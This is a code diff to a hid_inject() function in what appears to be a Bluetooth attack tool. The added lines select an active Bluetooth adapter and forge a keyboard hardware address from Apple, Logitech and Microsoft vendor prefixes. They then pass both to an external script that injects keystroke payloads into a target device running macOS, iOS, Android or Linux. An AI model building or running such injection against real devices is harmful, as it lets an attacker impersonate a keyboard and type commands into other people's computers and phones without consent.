@@ -10647,6 +10647,27 @@ def hid_inject():
             hid_injection_state['message'] = 'Initializing Bluetooth adapter...'
             hid_injection_state['error'] = None
 
+            # Detect available Bluetooth interface
+            bt_interface = 'hci0'  # Default
+            for iface in ['hci0', 'hci1', 'hci2']:
+                try:
+                    result = subprocess.run(['hciconfig', iface], capture_output=True, text=True, timeout=2)
+                    if 'UP RUNNING' in result.stdout:
+                        bt_interface = iface
+                        break
+                except:
+                    pass
+
+            # Generate a random keyboard BD address (using common keyboard OUI prefixes)
+            # Apple Magic Keyboard OUI: 28:37:37, Logitech: 00:1F:20, Microsoft: 28:18:78
+            keyboard_ouis = ['28:37:37', '00:1F:20', '28:18:78', 'DC:2C:26']
+            import random
+            keyboard_oui = random.choice(keyboard_ouis)
+            keyboard_suffix = ':'.join([f'{random.randint(0, 255):02X}' for _ in range(3)])
+            keyboard_address = f'{keyboard_oui}:{keyboard_suffix}'
+
+            add_log(f"Using interface {bt_interface}, keyboard address {keyboard_address}", "DEBUG")
+
             # Create a temporary file with the payload
             import tempfile
             with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
@@ -10657,6 +10678,10 @@ def hid_inject():
             # Note: The actual script requires specific Bluetooth adapter setup
             # This is a simplified wrapper that calls the script
             cmd = ['python3', script_path, '-t', target]
+
+            # Add interface and keyboard address for macOS/iOS scripts
+            if platform in ['macos', 'ios']:
+                cmd.extend(['-i', bt_interface, '-k', keyboard_address])
 
             # Some scripts take payload differently
             if platform in ['android', 'linux']:
